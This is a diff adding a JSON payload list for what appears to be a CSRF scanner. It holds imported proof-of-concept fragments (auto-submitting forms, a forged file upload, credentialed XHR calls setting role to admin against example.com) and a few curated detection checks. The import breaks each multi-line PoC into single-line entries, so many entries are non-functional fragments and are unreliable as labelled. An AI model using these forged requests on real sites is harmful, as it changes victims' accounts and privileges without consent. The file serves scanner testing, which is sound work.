@@ -1,0 +1,392 @@
+[
+  {
+    "id": "csrf-0001",
+    "payload": "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0002",
+    "payload": "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0003",
+    "payload": "<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0004",
+    "payload": "<input name=\"username\" type=\"hidden\" value=\"CSRFd\" />",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0005",
+    "payload": "<input type=\"submit\" value=\"Submit Request\" />",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0006",
+    "payload": "</form>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0007",
+    "payload": "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0008",
+    "payload": "<script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0009",
+    "payload": "document.getElementById(\"autosubmit\").submit();",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0010",
+    "payload": "</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0011",
+    "payload": "function launch(){",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0012",
+    "payload": "const dT = new DataTransfer();",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0013",
+    "payload": "const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0014",
+    "payload": "dT.items.add( file );",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0015",
+    "payload": "document.xss[0].files = dT.files;",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0016",
+    "payload": "document.xss.submit()",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0017",
+    "payload": "<form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0018",
+    "payload": "<input id=\"file\" type=\"file\" name=\"file\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0019",
+    "payload": "<input type=\"submit\" name=\"\" value=\"\" size=\"0\" />",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0020",
+    "payload": "<button value=\"button\" onclick=\"launch()\">Submit Request</button>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0021",
+    "payload": "var xhr = new XMLHttpRequest();",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0022",
+    "payload": "xhr.open(\"GET\", \"http://www.example.com/api/currentuser\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0023",
+    "payload": "xhr.send();",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0024",
+    "payload": "xhr.open(\"POST\", \"http://www.example.com/api/setrole\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0025",
+    "payload": "//application/json is not allowed in a simple request. text/plain is the default",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0026",
+    "payload": "xhr.setRequestHeader(\"Content-Type\", \"text/plain\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0027",
+    "payload": "//You will probably want to also try one or both of these",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0028",
+    "payload": "//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0029",
+    "payload": "//xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0030",
+    "payload": "xhr.send('{\"role\":admin}');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0031",
+    "payload": "<form id=\"CSRF_POC\" action=\"www.example.com/api/setrole\" enctype=\"text/plain\" method=\"POST\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0032",
+    "payload": "// this input will send : {\"role\":admin,\"other\":\"=\"}",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0033",
+    "payload": "<input type=\"hidden\" name='{\"role\":admin, \"other\":\"'  value='\"}' />",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0034",
+    "payload": "document.getElementById(\"CSRF_POC\").submit();",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0035",
+    "payload": "xhr.withCredentials = true;",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-0036",
+    "payload": "xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "csrf payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "csrf-001",
+    "payload": "missing_csrf_token",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "Detect state-changing form without anti-CSRF token",
+    "expected_feature": "POST form lacks token-like hidden field",
+    "source": "curated"
+  },
+  {
+    "id": "csrf-002",
+    "payload": "static_csrf_token",
+    "mode": "test",
+    "risk_level": "medium",
+    "enabled_by_default": true,
+    "purpose": "Detect non-rotating/constant CSRF token usage",
+    "expected_feature": "Same token value reused across sessions/requests",
+    "source": "curated"
+  },
+  {
+    "id": "csrf-101",
+    "payload": "cross_site_auto_submit",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "Actively validate CSRF exploitability with auto-submission",
+    "expected_feature": "State-changing action succeeds from external origin",
+    "source": "curated"
+  }
+]
